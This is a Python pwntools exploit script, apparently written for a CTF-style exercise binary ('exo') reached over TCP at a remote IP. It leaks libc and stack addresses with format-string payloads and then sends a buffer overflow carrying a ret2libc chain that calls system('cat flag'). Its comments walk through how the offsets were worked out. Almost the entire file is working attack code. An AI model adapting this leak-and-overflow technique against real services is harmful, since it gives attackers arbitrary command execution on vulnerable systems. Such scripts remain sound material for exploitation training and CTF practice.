from pwn import * # CONNECT:
target = remote("51.15.171.241", 9011) # TCP connection on port 9000
#target = remote("0.0.0.0", 9000) # TCP connection on port 9000
# target = process("./exo") # launch exercise exo100

# Base addr of libc : ldd exo => 0xf7d5b000
#libc_base = 0xf7d83000
# location of system :  readelf -s libc-2.31_32b.so | grep system => 00045000
#system = libc_base + 0x45000

#payload = b'AAAABBBB%4$x'

#off_system = 0x0047CB0
#off_exit = 0x00DCCB0
#addr_stdio = 0x00226620

off_system = 0x00041000
off_exit = 0x000C5CC5
addr_stdio = 0x001E4580 # _IO_2_1_stdin_

payload = b'%2$p'
target.sendline(payload)
print(target.recvline())

payload = b'%2$p|%262$p'
target.sendline(payload)
res = target.recvline()
print(res)
res = res.decode().strip("\n").split("|")
print(res)
leak_addr = res[0]
leak_addr = int(leak_addr,16)
leak_stack = int(res[1],16)

#exit()
# ldd exo
libc_base_addr = leak_addr - addr_stdio

print(f'leak_addr: {hex(leak_addr)}\n')
print(f'LIBC base: {hex(libc_base_addr)}\n')

# readelf -s libc-2.31_32b.so | grep system
memory_system_addr = libc_base_addr + off_system
memory_exit_addr = libc_base_addr + off_exit

buf = b'n'
buf += b'A' * (0x40C - len(buf))


# get addr of buffer in gdb here 0xffffcc50 and addr leak in 262 0xffffd098
buf_addr = (leak_stack - 0x448) # ebp - 0x408
sys_argument_addr = buf_addr + 0x40C + 3 * 4

print("system addr: %s" % hex(memory_system_addr))
print("exit addr: %s" % hex(memory_exit_addr))
print("system argument addr: %s" % hex(sys_argument_addr))

buf += p32(memory_system_addr) # system
buf += p32(memory_exit_addr) # exit
buf += p32(sys_argument_addr) # system argument addr
buf += b"          cat flag\0" # cat flag str

print("sending...")
target.sendline(buf)
print("recv...")

for i in range (100) :
    print(target.recvline())
